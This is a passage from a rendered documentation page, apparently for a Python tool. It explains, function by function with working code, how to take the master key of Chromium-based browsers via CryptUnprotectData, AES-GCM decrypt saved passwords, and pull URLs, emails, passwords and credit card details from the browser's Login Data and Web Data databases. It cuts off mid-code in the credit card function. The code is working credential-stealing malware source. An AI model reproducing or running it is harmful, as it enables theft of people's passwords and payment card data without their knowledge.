47%)">,</span><span class="token plain"> encoding</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;utf-8&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">as</span><span class="token plain"> f</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        c </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> f</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">read</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;os_crypt&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">not</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> c</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">merror</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f&quot;Unable to get master key for </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">browser_name</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> Browser, &#x27;os_crypt&#x27; is cannot be found in </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">filename</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        local_state </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">loads</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">c</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    master_key </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> base64</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">b64decode</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">local_state</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;os_crypt&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;encrypted_key&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    master_key </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> master_key</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">5</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    master_key </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> CryptUnprotectData</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">master_key</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">None</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">None</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">None</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">mdebug</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f&quot;Got Master Key for </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">browser_name</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> Browser at PATH: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">browser_path</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> master_key</span><br></span></code></pre><div class="buttonGroup_6DOT"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_FhaS" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_phi_"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_FfTR"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul>
<li>
<p><strong>Input:</strong></p>
<ul>
<li><code>browser_path</code>: The path to the Chromium-based browser.</li>
<li><code>browser_name</code>: A string representing the name of the browser.</li>
</ul>
</li>
<li>
<p><strong>Output:</strong></p>
<ul>
<li>Returns the extracted master key as bytes.</li>
</ul>
</li>
<li>
<p><strong>Details:</strong></p>
<ul>
<li>The function reads the local state file of the browser to extract the encrypted key (<code>os_crypt</code>).</li>
<li>It decodes the base64-encoded key and uses <code>CryptUnprotectData</code> to decrypt it.</li>
<li>The master key is returned.</li>
</ul>
</li>
</ul><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="32-password-decryption">3.2 Password Decryption<a href="#32-password-decryption" class="hash-link" aria-label="Direct link to 3.2 Password Decryption" title="Direct link to 3.2 Password Decryption">​</a></h5><p>The <code>__decrypt_password</code> function decrypts the encrypted password using the master key.</p><div class="language-python codeBlockContainer_APcc theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_m3Ux"><pre tabindex="0" class="prism-code language-python codeBlock_qGQc thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_p187"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">__decrypt_password</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> buff</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">bytes</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> master_key</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">bytes</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    iv </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> buff</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token number" style="color:hsl(35, 99%, 36%)">15</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    payload </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> buff</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">15</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    cipher </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> AES</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">new</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">master_key</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> AES</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">MODE_GCM</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> iv</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    decrypted_pass </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> cipher</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">decrypt</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    decrypted_pass </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> decrypted_pass</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token number" style="color:hsl(35, 99%, 36%)">16</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> decrypted_pass</span><br></span></code></pre><div class="buttonGroup_6DOT"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_FhaS" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_phi_"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_FfTR"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul>
<li>
<p><strong>Input:</strong></p>
<ul>
<li><code>buff</code>: The encrypted password as bytes.</li>
<li><code>master_key</code>: The master key used for decryption.</li>
</ul>
</li>
<li>
<p><strong>Output:</strong></p>
<ul>
<li>Returns the decrypted password as a string.</li>
</ul>
</li>
<li>
<p><strong>Details:</strong></p>
<ul>
<li>The function extracts the initialization vector (IV) and payload from the encrypted buffer.</li>
<li>It uses the master key and AES encryption to decrypt the payload.</li>
<li>The decrypted password is returned after decoding from bytes to a string.</li>
</ul>
</li>
</ul><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="33-data-retrieval-functions">3.3 Data Retrieval Functions<a href="#33-data-retrieval-functions" class="hash-link" aria-label="Direct link to 3.3 Data Retrieval Functions" title="Direct link to 3.3 Data Retrieval Functions">​</a></h5><p>Now, let&#x27;s look at the functions responsible for retrieving specific types of data from the browser&#x27;s database.</p><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="331-__get_login_data">3.3.1 <code>__get_login_data</code><a href="#331-__get_login_data" class="hash-link" aria-label="Direct link to 331-__get_login_data" title="Direct link to 331-__get_login_data">​</a></h5><p>This function retrieves saved login data (URL, username, decrypted password) from the browser&#x27;s Login Data database.</p><div class="language-python codeBlockContainer_APcc theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_m3Ux"><pre tabindex="0" class="prism-code language-python codeBlock_qGQc thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_p187"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">__get_login_data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> profile</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> master_key</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">bytes</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> browser_name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># ... (previously explained)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> row </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> cursor</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">fetchall</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">try</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            password </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">__decrypt_password</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">row</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> master_key</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">except</span><span class="token plain"> Exception </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">as</span><span class="token plain"> e</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">merror</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f&quot;[</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">browser_name</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">] [</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">profile</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">] [passwords] Error in decrypting the password for </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">row</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">1</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> -&gt; </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">row</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">2</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> -&gt; </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">e</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            password </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;Error. Check the log&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        result </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f&quot;&quot;&quot;\nURL: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">row</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">0</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">\nEmail: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">row</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">1</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">\nPassword: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">password</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">&quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        result </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+=</span><span class="token plain"> Constant</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">seperator</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># ... (closing database connection)</span><br></span></code></pre><div class="buttonGroup_6DOT"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_FhaS" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_phi_"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_FfTR"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="332-__get_credit_cards">3.3.2 <code>__get_credit_cards</code><a href="#332-__get_credit_cards" class="hash-link" aria-label="Direct link to 332-__get_credit_cards" title="Direct link to 332-__get_credit_cards">​</a></h5><p>This function retrieves credit card details (name, decrypted card number, expiration date) from the browser&#x27;s Web Data database.</p><div class="language-python codeBlockContainer_APcc theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_m3Ux"><pre tabindex="0" class="prism-code language-python codeBlock_qGQc thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_p187"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">__get_credit_cards</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> profile</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> master_key</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">bytes</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> browser_name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># ... (previously explained)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> row </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> cursor</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">fetchall</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">not</span><span class="token plain"> row</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">or</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">not</span><span class="token plain"> row</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">or</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">not</span><span class="token plain"> row</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">or</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">not</span><span class="token plain"> row</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">try</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            card_number </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> self</span><span class="token punctuation" 